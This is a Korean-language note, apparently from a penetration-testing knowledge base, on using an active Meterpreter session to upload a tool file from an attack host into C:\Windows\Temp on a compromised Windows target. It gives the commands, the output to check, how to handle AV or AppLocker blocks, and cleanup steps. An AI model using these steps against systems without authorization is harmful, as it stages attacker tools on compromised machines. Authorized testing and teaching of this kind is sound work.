---
tags:
  - 환경/windows
시작조건: ["Windows Meterpreter 세션 확보"]
필요권한: ["대상 저장 경로 쓰기 권한"]
필요조건: ["공격 호스트의 원본 파일", "활성 Meterpreter 세션", "대상 저장 경로"]
결과: ["Windows 대상의 도구 파일"]
---

# Meterpreter upload로 Windows 파일 반입

## 한 줄 판단

Windows 대상의 활성 Meterpreter 세션과 대상 경로 쓰기 권한이 있다면, 공격 호스트의 파일을 `upload`로 반입하고 업로드 출력과 대상 경로로 반입을 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| Meterpreter 세션 | 대상 Windows 호스트의 활성 세션 | `getuid`, `sysinfo`, `pwd` | 세션 timeout·대상 호스트·arch 확인 |
| 원본 파일 | 공격 호스트에서 읽을 수 있는 파일 | 파일 경로 확인 | 로컬 경로 확인 |
| 대상 경로 | 현재 세션이 쓸 수 있는 디렉터리 | `ls`, `pwd` 또는 OS 셸의 ACL 확인 | 사용자 Temp 등 다른 경로 선택 |

## 실행

```text
meterpreter > getuid
meterpreter > sysinfo
meterpreter > shell
C:\> if exist "C:\Windows\Temp\<REMOTE_FILE>" echo DESTINATION_EXISTS
C:\> exit
meterpreter > upload <LOCAL_FILE> C:\Windows\Temp\<REMOTE_FILE>
meterpreter > ls C:\Windows\Temp\<REMOTE_FILE>
meterpreter > shell
C:\> exit
```

`DESTINATION_EXISTS`가 출력되면 업로드하지 않고 새 `<REMOTE_FILE>` 이름을 정한다. `upload`의 로컬 입력은 Linux 공격 호스트의 Metasploit process가 읽는 경로이고, 원격 목적지는 Windows 대상 경로다.

`<LOCAL_FILE>`은 공격 호스트의 읽을 수 있는 파일 경로(예: `./tool.exe`)이고, `<REMOTE_FILE>`은 대상 Windows `C:\\Windows\\Temp` 아래에 새로 만들 파일명(예: `tool.exe`)이다.

확인할 출력:

- `uploaded ... to ...`와 원격 파일 경로가 표시된다.
- `ls`에서 대상 파일 경로를 확인한다.
- 세션 timeout이면 파일 권한보다 세션 생존과 channel 상태를 먼저 확인한다.
- 업로드는 성공했지만 실행이 거부되면 arch·ACL·AppLocker·AV 차단을 별도로 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 업로드 메시지와 원격 파일 경로 | Meterpreter 경유 파일 반입 성공 | Windows 대상의 도구 파일 | 파일을 사용할 공격기법으로 돌아가 실행 |
| 원격 경로 access denied | 현재 세션이 경로에 쓸 수 없음 | 시작 상태 유지 | 사용자 Temp·현재 디렉터리 ACL 확인 |
| 세션 timeout·channel 종료 | 전송 전에 Meterpreter 세션 불안정 | 파일 반입 미확정 | [[Meterpreter 프로세스 이동과 세션 안정화]] 후 재확인 |

## 확인할 출력과 권한

- `upload` 성공과 원격 파일 존재를 각각 확인한다.
- 파일 반입은 도구 실행 권한이나 자격 증명 추출 성공을 의미하지 않는다.

## 변경 영향과 복구

| 변경 대상 | 기존 상태·식별값 | 복구 절차 | 완료 확인 |
|---|---|---|---|
| 대상 저장 파일 | 실행 전 존재하지 않은 exact `C:\Windows\Temp\<REMOTE_FILE>` | 파일을 사용하는 process를 먼저 종료한 뒤 `rm C:\Windows\Temp\<REMOTE_FILE>` | `ls C:\Windows\Temp\<REMOTE_FILE>`가 파일을 반환하지 않음 |

Meterpreter session은 이 기법의 입력이므로 여기서 일괄 종료하지 않는다. 이 업로드 뒤 별도 기법이 만든 process·session이 있으면 그 문서의 종료 순서를 먼저 따른다. 기존 원격 파일이 있었으면 이번 파일로 구분할 수 없으므로 삭제하지 않는다.

## 관련 도구

- [[meterpreter]]

## 관련 상태 라우터

- [[Meterpreter 세션 후속 행동]]
- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
